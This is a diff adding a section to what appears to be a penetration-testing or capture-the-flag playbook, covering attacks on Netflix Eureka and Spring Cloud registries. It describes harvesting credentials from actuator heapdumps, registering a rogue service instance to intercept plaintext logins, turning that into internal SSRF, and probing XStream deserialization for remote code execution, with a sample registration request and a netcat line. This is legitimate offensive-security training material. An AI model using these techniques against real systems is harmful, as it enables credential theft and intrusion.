@@ -782,3 +782,66 @@ custom binary service, see `references/binary.md`.
 ```bash
 pwnloop x "nc -nv $T <port>"
 ```
+
+## Eureka / Spring Cloud service registry (8761 and the microservice mesh)
+
+A `8761/tcp` that answers `401` with `WWW-Authenticate: Basic` and Spring-ish
+headers is a **Netflix Eureka** registry fronting a Spring Cloud estate (a
+Gateway plus several backend services, usually bound to localhost). The registry
+is the lever: it is both a credential source and a routing-control primitive.
+
+**Pin the mesh first.** Spring Boot Actuator on the public app
+(`/actuator/heapdump`, `/actuator/env`) routinely leaks the Eureka Basic creds
+and datasource creds — `env` masks values (`******`) but `heapdump` hands over
+the raw heap; `strings | grep` the heap for `defaultZone`, `datasource.password`,
+`Authorization: Basic ...`. **Beware a trailing delimiter byte**: values in a
+heap/`strings` dump are often followed by a separator that prints as punctuation
+(e.g. `!`); test a recovered secret both with and without the trailing char
+before deciding it is wrong.
+
+**List the registry** (`GET /eureka/apps` with the Basic creds, `Accept:
+application/json`) to learn every VIP and its instances: the Gateway, and
+backend services like `USER-MANAGEMENT-SERVICE`.
+
+**Registration poisoning = credential capture / request interception.** The
+Gateway resolves `lb://<SERVICE>` through the registry and *load-balances across
+all registered instances*. Register a **rogue instance** for a service that real
+traffic flows to, pointing `ipAddr`/`port` at your own listener:
+
+```
+POST /eureka/apps/<SERVICE>    (Basic: <eureka-creds>)
+{ "instance": { "app":"<SERVICE>", "ipAddr":"<tun0>", "vipAddress":"<SERVICE>",
+                "status":"UP", "port":{"$":<port>,"@enabled":"true"},
+                "dataCenterInfo":{"@class":"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name":"MyOwn"} } }
+```
+
+The Gateway then round-robins a share of that service's requests to you. If an
+automated/periodic login hits the auth service, you capture its plaintext
+form body on a bare HTTP listener. The LB instance cache refreshes on a ~30 s TTL,
+so wait ~35 s after any registration change before testing, and your own rogue
+instance can interfere with your *own* requests — deregister it
+(`DELETE /eureka/apps/<SERVICE>/<instanceId>`) when you need clean traffic.
+
+**Rogue instance as path-controlled internal SSRF.** The Gateway's catch-all
+route (`/**` → `lb://<FRONT-APP>`) forwards *arbitrary* paths. Register a rogue
+instance of that front-app pointing at an internal `host:port` and the Gateway
+proxies any path you request to that target — a path-controlled SSRF into
+localhost-only services. (Note it cannot reach the Gateway's *own* actuator if a
+route already shadows `/actuator` to a backend, and it is round-robined ~50 %
+with the real instance unless you also mark the real one `OUT_OF_SERVICE` via
+`POST /actuator/serviceregistry`.)
+
+**Eureka XML registration is parsed by XStream.** `POST /eureka/apps/<app>` with
+`Content-Type: application/xml` is deserialized by a frequently-permissive
+XStream — a deserialization-RCE surface. On a modern target JDK (17+), the public
+collection-trigger gadgets (`sorted-set`/`sorted-map`/`priority-queue`) fail
+(`...Converter$Reflections` cannot initialise — reflection into `java.base` is
+blocked) and `java.beans.EventHandler` ignores the `hashCode`/`equals` triggers a
+`<map>`/hash-set would give, and `TemplatesImpl` is module-blocked. A working
+gadget there is classpath-dependent (CommonsBeanutils/Commons-Collections pulled
+transitively by `archaius`, or a Spring-AOP chain). Confirm permissiveness
+cheaply: a `500` naming an XStream converter (not a `ForbiddenClassException`)
+means arbitrary types are being instantiated. Registered string fields are
+XML-escaped on serialization, so you cannot inject a raw gadget into a *field*
+read back by a client — the deserialization-of-your-POST on the server is the
+primitive.
